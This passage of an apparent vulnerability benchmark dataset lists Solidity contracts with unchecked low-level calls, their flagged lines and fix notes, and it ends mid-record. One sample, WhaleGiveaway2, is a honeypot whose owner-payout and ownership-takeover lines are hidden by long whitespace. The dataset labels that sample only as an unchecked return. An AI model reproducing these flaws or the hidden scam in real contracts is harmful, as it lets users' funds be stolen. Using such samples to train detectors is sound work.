    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\n pragma solidity ^0.4.18;\n\ncontract MultiplicatorX4\n{\n    address public Owner = msg.sender;\n   \n    function() public payable{}\n   \n    function withdraw()\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n    \n    function multiplicate(address adr)\n    public\n    payable\n    {\n        if(msg.value>=this.balance)\n        {        \n            adr.transfer(this.balance+msg.value);\n        }\n    }\n}",
    "vulnerable_function": "Command",
    "vulnerable_lines": [
      29
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 29",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol",
    "pragma": "0.4.18",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 45\n */\n\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway2\n{\n    address public Owner = msg.sender;\n    uint constant public minEligibility = 0.999001 ether; \n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function redeem()\n    public\n    payable\n    {                                                                    \n        if(msg.value>=minEligibility)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "vulnerable_function": "Command",
    "vulnerable_lines": [
      45
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 45",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x4051334adc52057aca763453820cb0e045076ef3",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x4051334adc52057aca763453820cb0e045076ef3.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 16\n */\n\npragma solidity ^0.4.24;\n \ncontract airdrop{\n    \n    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n             // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],v);\n        }\n        return true;\n    }\n}",
    "vulnerable_function": "transfer",
    "vulnerable_lines": [
      16
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 16",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x4051334adc52057aca763453820cb0e045076ef3.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x4a66ad0bca2d700f11e1f2fc2c106f7d3264504c",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x4a66ad0bca2d700f11e1f2fc2c106f7d3264504c.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 19 \n */\n\npragma solidity ^0.4.18;\n\ncontract EBU{\n    address public from = 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9;\n    address public caddress = 0x1f844685f7Bf86eFcc0e74D8642c54A257111923;\n    \n    function transfer(address[] _tos,uint[] v)public returns (bool){\n        require(msg.sender == 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9);\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],v[i]*1000000000000000000);\n        }\n        return true;\n    }\n}",
    "vulnerable_function": "transfer",
    "vulnerable_lines": [
      19
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 19",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x4a66ad0bca2d700f11e1f2fc2c106f7d3264504c.sol",
    "pragma": "0.4.18",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.4.24;\n\n\ncontract airPort{\n    \n    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],v);\n        }\n        return true;\n    }\n}",
    "vulnerable_function": "transfer",
    "vulnerable_lines": [
      17
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 17",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x524960d55174d912768678d8c606b4d50b79d7b1",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x524960d55174d912768678d8c606b4d50b79d7b1.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 21\n */\n\npragma solidity ^0.4.13;\n\ncontract Centra4 {\n\n\tfunction transfer() returns (bool) {\t\n\t\taddress contract_address;\n\t\tcontract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;\n\t\taddress c1;\t\t\n\t\taddress c2;\n\t\tuint256 k;\n\t\tk = 1;\n\t\t\n\t\tc2 = 0xaa27f8c1160886aacba64b2319d8d5469ef2af79;\t\n\t\t// <yes> <report> UNCHECKED_LL_CALLS\t\n\t\tcontract_address.call(\"register\", \"CentraToken\");\n\t\tif(!contract_address.call(bytes4(keccak256(\"transfer(address,uint256)\")),c2,k)) return false;\n\n\t\treturn true;\n\t}\n\n}",
    "vulnerable_function": "transfer",
    "vulnerable_lines": [
      21
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 21",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x524960d55174d912768678d8c606b4d50b79d7b1.sol",
    "pragma": "0.4.13",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x52d2e0f9b01101a59b38a3d05c80b7618aeed984",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x52d2e0f9b01101a59b38a3d05c80b7618aeed984.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 27\n */\n\npragma solidity ^0.4.19;\ncontract Token {\n    function transfer(address _to, uint _value) returns (bool success);\n    function balanceOf(address _owner) constant returns (uint balance);\n}\ncontract EtherGet {\n    address owner;\n    function EtherGet() {\n        owner = msg.sender;\n    }\n    function withdrawTokens(address tokenContract) public {\n        Token tc = Token(tokenContract);\n        tc.transfer(owner, tc.balanceOf(this));\n    }\n    function withdrawEther() public {\n        owner.transfer(this.balance);\n    }\n    function getTokens(uint num, address addr) public {\n        for(uint i = 0; i < num; i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            addr.call.value(0 wei)();\n        }\n    }\n}",
    "vulnerable_function": "getTokens",
    "vulnerable_lines": [
      27
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 27",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x52d2e0f9b01101a59b38a3d05c80b7618aeed984.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x5aa88d2901c68fda244f1d0584400368d2c8e739",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x5aa88d2901c68fda244f1d0584400368d2c8e739.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.18;\n\ncontract MultiplicatorX3\n{\n    address public Owner = msg.sender;\n   \n    function() public payable{}\n   \n    function withdraw()\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n    \n    function multiplicate(address adr)\n    public\n    payable\n    {\n        if(msg.value>=this.balance)\n        {        \n            adr.transfer(this.balance+msg.value);\n        }\n    }\n}",
    "vulnerable_function": "Command",
    "vulnerable_lines": [
      29
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 29",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x5aa88d2901c68fda244f1d0584400368d2c8e739.sol",
    "pragma": "0.4.18",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x610495793564aed0f9c7fc48dc4c7c9151d34fd6",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x610495793564aed0f9c7fc48dc4c7c9151d34fd6.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 33\n */\n\npragma solidity ^0.4.24;\n\n\ncontract SimpleWallet {\n    address public owner = msg.sender;\n    uint public depositsCount;\n    \n    modifier onlyOwner {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    function() public payable {\n        depositsCount++;\n    }\n    \n    function withdrawAll() public onlyOwner {\n        withdraw(address(this).balance);\n    }\n    \n    function withdraw(uint _value) public onlyOwner {\n        msg.sender.transfer(_value);\n    }\n    \n    function sendMoney(address _target, uint _value, bytes _data) public onlyOwner {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        _target.call.value(_value)(_data);\n    }\n}",
    "vulnerable_function": "sendMoney",
    "vulnerable_lines": [
      33
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 33",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x610495793564aed0f9c7fc48dc4c7c9151d34fd6.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n         // <yes> <report> UNCHECKED_LL_CALLS\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[_addr]>0)\n        {\n            if(_addr.call.value(_wei)())\n            {\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n}",
    "vulnerable_function": "WithdrawToken",
    "vulnerable_lines": [
      44
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 44",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x663e4229142a27f00bafb5d087e1e730648314c3",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x663e4229142a27f00bafb5d087e1e730648314c3.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 1152,1496,2467\n */\n\npragma solidity ^0.4.24;\n\n\ncontract ERC20 {\n    function totalSupply() constant returns (uint supply);\n    function balanceOf( address who ) constant returns (uint value);\n    function allowance( address owner, address spender ) constant returns (uint _allowance);\n\n    function transfer( address to, uint value) returns (bool ok);\n    function transferFrom( address from, address to, uint value) returns (bool ok);\n    function approve( address spender, uint value ) returns (bool ok);\n\n    event Transfer( address indexed from, address indexed to, uint value);\n    event Approval( address indexed owner, address indexed spender, uint value);\n}\n/**\n * @title Ownable\n * @dev The Ownable contract has an owner address, and provides basic authorization control\n * functions, this simplifies the implementation of \"user permissions\".\n */\ncontract Ownable {\n  address public owner;\n\n\n  /**\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n   * account.\n   */\n  function Ownable() {\n    owner = msg.sender;\n  }\n\n\n  /**\n   * @dev Throws if called by any account other than the owner.\n   */\n  modifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n  }\n\n\n  /**\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\n   * @param newOwner The address to transfer ownership to.\n   */\n  function transferOwnership(address newOwner) onlyOwner {\n    if (newOwner != address(0)) {\n      owner = newOwner;\n    }\n  }\n\n}\n\n/// @title Interface for contracts conforming to ERC-721: Non-Fungible Tokens\n/// @author Dieter Shirley <dete@axiomzen.co> (https://github.com/dete)\ncontract ERC721 {\n    // Required methods\n    function totalSupply() public view returns (uint256 total);\n    function balanceOf(address _owner) public view returns (uint256 balance);\n    function ownerOf(uint256 _tokenId) external view returns (address owner);\n    function approve(address _to, uint256 _tokenId) external;\n    function transfer(address _to, uint256 _tokenId) external;\n    function transferFrom(address _from, address _to, uint256 _tokenId) external;\n\n    // Events\n    event Transfer(address from, address to, uint256 tokenId);\n    event Approval(address owner, address approved, uint256 tokenId);\n\n    // Optional\n    // function name() public view returns (string name);\n    // function symbol() public view returns (string symbol);\n    // function tokensOfOwner(address _owner) external view returns (uint256[] tokenIds);\n    // function tokenMetadata(uint256 _tokenId, string _preferredTransport) public view returns (string infoUrl);\n\n    // ERC-165 Compatibility (https://github.com/ethereum/EIPs/issues/165)\n    function supportsInterface(bytes4 _interfaceID) external view returns (bool);\n}\n\ncontract GeneScienceInterface {\n    /// @dev simply a boolean to indicate this is the contract we expect to be\n    function isGeneScience() public pure returns (bool);\n\n    /// @dev given genes of kitten 1 & 2, return a genetic combination - may have a random factor\n    /// @param genes1 genes of mom\n    /// @param genes2 genes of sire\n    /// @return the genes that are supposed to be passed down the child\n    function mixGenes(uint256[2] genes1, uint256[2] genes2,uint256 g1,uint256 g2, uint256 targetBlock) public returns (uint256[2]);\n\n    function getPureFromGene(uint256[2] gene) public view returns(uint256);\n\n    /// @dev get sex from genes 0: female 1: male\n    function getSex(uint256[2] gene) public view returns(uint256);\n\n    /// @dev get wizz type from gene\n    function getWizzType(uint256[2] gene) public view returns(uint256);\n\n    function clearWizzType(uint256[2] _gene) public returns(uint256[2]);\n}\n\n/// @title A facet of PandaCore that manages special access privileges.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev See the PandaCore contract documentation to understand how the various contract facets are arranged.\ncontract PandaAccessControl {\n    // This facet controls access control for CryptoPandas. There are four roles managed here:\n    //\n    //     - The CEO: The CEO can reassign other roles and change the addresses of our dependent smart\n    //         contracts. It is also the only role that can unpause the smart contract. It is initially\n    //         set to the address that created the smart contract in the PandaCore constructor.\n    //\n    //     - The CFO: The CFO can withdraw funds from PandaCore and its auction contracts.\n    //\n    //     - The COO: The COO can release gen0 pandas to auction, and mint promo cats.\n    //\n    // It should be noted that these roles are distinct without overlap in their access abilities, the\n    // abilities listed for each role above are exhaustive. In particular, while the CEO can assign any\n    // address to any role, the CEO address itself doesn't have the ability to act in those roles. This\n    // restriction is intentional so that we aren't tempted to use the CEO address frequently out of\n    // convenience. The less we use an address, the less likely it is that we somehow compromise the\n    // account.\n\n    /// @dev Emited when contract is upgraded - See README.md for updgrade plan\n    event ContractUpgrade(address newContract);\n\n    // The addresses of the accounts (or contracts) that can execute actions within each roles.\n    address public ceoAddress;\n    address public cfoAddress;\n    address public cooAddress;\n\n    // @dev Keeps track whether the contract is paused. When that is true, most actions are blocked\n    bool public paused = false;\n\n    /// @dev Access modifier for CEO-only functionality\n    modifier onlyCEO() {\n        require(msg.sender == ceoAddress);\n        _;\n    }\n\n    /// @dev Access modifier for CFO-only functionality\n    modifier onlyCFO() {\n        require(msg.sender == cfoAddress);\n        _;\n    }\n\n    /// @dev Access modifier for COO-only functionality\n    modifier onlyCOO() {\n        require(msg.sender == cooAddress);\n        _;\n    }\n\n    modifier onlyCLevel() {\n        require(\n            msg.sender == cooAddress ||\n            msg.sender == ceoAddress ||\n            msg.sender == cfoAddress\n        );\n        _;\n    }\n\n    /// @dev Assigns a new address to act as the CEO. Only available to the current CEO.\n    /// @param _newCEO The address of the new CEO\n    function setCEO(address _newCEO) external onlyCEO {\n        require(_newCEO != address(0));\n\n        ceoAddress = _newCEO;\n    }\n\n    /// @dev Assigns a new address to act as the CFO. Only available to the current CEO.\n    /// @param _newCFO The address of the new CFO\n    function setCFO(address _newCFO) external onlyCEO {\n        require(_newCFO != address(0));\n\n        cfoAddress = _newCFO;\n    }\n\n    /// @dev Assigns a new address to act as the COO. Only available to the current CEO.\n    /// @param _newCOO The address of the new COO\n    function setCOO(address _newCOO) external onlyCEO {\n        require(_newCOO != address(0));\n\n        cooAddress = _newCOO;\n    }\n\n    /*** Pausable functionality adapted from OpenZeppelin ***/\n\n    /// @dev Modifier to allow actions only when the contract IS NOT paused\n    modifier whenNotPaused() {\n        require(!paused);\n        _;\n    }\n\n    /// @dev Modifier to allow actions only when the contract IS paused\n    modifier whenPaused {\n        require(paused);\n        _;\n    }\n\n    /// @dev Called by any \"C-level\" role to pause the contract. Used only when\n    ///  a bug or exploit is detected and we need to limit damage.\n    function pause() external onlyCLevel whenNotPaused {\n        paused = true;\n    }\n\n    /// @dev Unpauses the smart contract. Can only be called by the CEO, since\n    ///  one reason we may pause the contract is when CFO or COO accounts are\n    ///  compromised.\n    /// @notice This is public rather than external so it can be called by\n    ///  derived contracts.\n    function unpause() public onlyCEO whenPaused {\n        // can't unpause if contract was upgraded\n        paused = false;\n    }\n}\n\n\n\n\n\n\n\n\n/// @title Base contract for CryptoPandas. Holds all common structs, events and base variables.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev See the PandaCore contract documentation to understand how the various contract facets are arranged.\ncontract PandaBase is PandaAccessControl {\n    /*** EVENTS ***/\n\n    uint256 public constant GEN0_TOTAL_COUNT = 16200;\n    uint256 public gen0CreatedCount;\n\n    /// @dev The Birth event is fired whenever a new kitten comes into existence. This obviously\n    ///  includes any time a cat is created through the giveBirth method, but it is also called\n    ///  when a new gen0 cat is created.\n    event Birth(address owner, uint256 pandaId, uint256 matronId, uint256 sireId, uint256[2] genes);\n\n    /// @dev Transfer event as defined in current draft of ERC721. Emitted every time a kitten\n    ///  ownership is assigned, including births.\n    event Transfer(address from, address to, uint256 tokenId);\n\n    /*** DATA TYPES ***/\n\n    /// @dev The main Panda struct. Every cat in CryptoPandas is represented by a copy\n    ///  of this structure, so great care was taken to ensure that it fits neatly into\n    ///  exactly two 256-bit words. Note that the order of the members in this structure\n    ///  Ref: http://solidity.readthedocs.io/en/develop/miscellaneous.html\n    struct Panda {\n        // The Panda's genetic code is packed into these 256-bits, the format is\n        // sooper-sekret! A cat's genes never change.\n        uint256[2] genes;\n\n        // The timestamp from the block when this cat came into existence.\n        uint64 birthTime;\n\n        // The minimum timestamp after which this cat can engage in breeding\n        // activities again. This same timestamp is used for the pregnancy\n        // timer (for matrons) as well as the siring cooldown.\n        uint64 cooldownEndBlock;\n\n        // The ID of the parents of this panda, set to 0 for gen0 cats.\n        // Note that using 32-bit unsigned integers limits us to a \"mere\"\n        // 4 billion cats. This number might seem small until you realize\n        // that Ethereum currently has a limit of about 500 million\n        // transactions per year! So, this definitely won't be a problem\n        // for several years (even as Ethereum learns to scale).\n        uint32 matronId;\n        uint32 sireId;\n\n        // Set to the ID of the sire cat for matrons that are pregnant,\n        // zero otherwise. A non-zero value here is how we know a cat\n        // is pregnant. Used to retrieve the genetic material for the new\n        // kitten when the birth transpires.\n        uint32 siringWithId;\n\n        // Set to the index in the cooldown array (see below) that represents\n        // the current cooldown duration for this Panda. This starts at zero\n        // for gen0 cats, and is initialized to floor(generation/2) for others.\n        // Incremented by one for each successful breeding action, regardless\n        // of whether this cat is acting as matron or sire.\n        uint16 cooldownIndex;\n\n        // The \"generation number\" of this cat. Cats minted by the CK contract\n        // for sale are called \"gen0\" and have a generation number of 0. The\n        // generation number of all other cats is the larger of the two generation\n        // numbers of their parents, plus one.\n        // (i.e. max(matron.generation, sire.generation) + 1)\n        uint16 generation;\n    }\n\n    /*** CONSTANTS ***/\n\n    /// @dev A lookup table indicating the cooldown duration after any successful\n    ///  breeding action, called \"pregnancy time\" for matrons and \"siring cooldown\"\n    ///  for sires. Designed such that the cooldown roughly doubles each time a cat\n    ///  is bred, encouraging owners not to just keep breeding the same cat over\n    ///  and over again. Caps out at one week (a cat can breed an unbounded number\n    ///  of times, and the maximum cooldown is always seven days).\n    uint32[9] public cooldowns = [\n        uint32(5 minutes),\n        uint32(30 minutes),\n        uint32(2 hours),\n        uint32(4 hours),    \n        uint32(8 hours),\n        uint32(24 hours),\n        uint32(48 hours),\n        uint32(72 hours),\n        uint32(7 days)\n    ];\n\n    // An approximation of currently how many seconds are in between blocks.\n    uint256 public secondsPerBlock = 15;\n\n    /*** STORAGE ***/\n\n    /// @dev An array containing the Panda struct for all Pandas in existence. The ID\n    ///  of each cat is actually an index into this array. Note that ID 0 is a negacat,\n    ///  the unPanda, the mythical beast that is the parent of all gen0 cats. A bizarre\n    ///  creature that is both matron and sire... to itself! Has an invalid genetic code.\n    ///  In other words, cat ID 0 is invalid... ;-)\n    Panda[] pandas;\n\n    /// @dev A mapping from cat IDs to the address that owns them. All cats have\n    ///  some valid owner address, even gen0 cats are created with a non-zero owner.\n    mapping (uint256 => address) public pandaIndexToOwner;\n\n    // @dev A mapping from owner address to count of tokens that address owns.\n    //  Used internally inside balanceOf() to resolve ownership count.\n    mapping (address => uint256) ownershipTokenCount;\n\n    /// @dev A mapping from PandaIDs to an address that has been approved to call\n    ///  transferFrom(). Each Panda can only have one approved address for transfer\n    ///  at any time. A zero value means no approval is outstanding.\n    mapping (uint256 => address) public pandaIndexToApproved;\n\n    /// @dev A mapping from PandaIDs to an address that has been approved to use\n    ///  this Panda for siring via breedWith(). Each Panda can only have one approved\n    ///  address for siring at any time. A zero value means no approval is outstanding.\n    mapping (uint256 => address) public sireAllowedToAddress;\n\n    /// @dev The address of the ClockAuction contract that handles sales of Pandas. This\n    ///  same contract handles both peer-to-peer sales as well as the gen0 sales which are\n    ///  initiated every 15 minutes.\n    SaleClockAuction public saleAuction;\n\n    /// @dev The address of a custom ClockAuction subclassed contract that handles siring\n    ///  auctions. Needs to be separate from saleAuction because the actions taken on success\n    ///  after a sales and siring auction are quite different.\n    SiringClockAuction public siringAuction;\n\n\n    /// @dev The address of the sibling contract that is used to implement the sooper-sekret\n    ///  genetic combination algorithm.\n    GeneScienceInterface public geneScience;\n\n\n    SaleClockAuctionERC20 public saleAuctionERC20;\n\n\n    // wizz panda total\n    mapping (uint256 => uint256) public wizzPandaQuota;\n    mapping (uint256 => uint256) public wizzPandaCount;\n\n    \n    /// wizz panda control\n    function getWizzPandaQuotaOf(uint256 _tp) view external returns(uint256) {\n        return wizzPandaQuota[_tp];\n    }\n\n    function getWizzPandaCountOf(uint256 _tp) view external returns(uint256) {\n        return wizzPandaCount[_tp];\n    }\n\n    function setTotalWizzPandaOf(uint256 _tp,uint256 _total) external onlyCLevel {\n        require (wizzPandaQuota[_tp]==0);\n        require (_total==uint256(uint32(_total)));\n        wizzPandaQuota[_tp] = _total;\n    }\n\n    function getWizzTypeOf(uint256 _id) view external returns(uint256) {\n        Panda memory _p = pandas[_id];\n        return geneScience.getWizzType(_p.genes);\n    }\n\n    /// @dev Assigns ownership of a specific Panda to an address.\n    function _transfer(address _from, address _to, uint256 _tokenId) internal {\n        // Since the number of kittens is capped to 2^32 we can't overflow this\n        ownershipTokenCount[_to]++;\n        // transfer ownership\n        pandaIndexToOwner[_tokenId] = _to;\n        // When creating new kittens _from is 0x0, but we can't account that address.\n        if (_from != address(0)) {\n            ownershipTokenCount[_from]--;\n            // once the kitten is transferred also clear sire allowances\n            delete sireAllowedToAddress[_tokenId];\n            // clear any previously approved ownership exchange\n            delete pandaIndexToApproved[_tokenId];\n        }\n        // 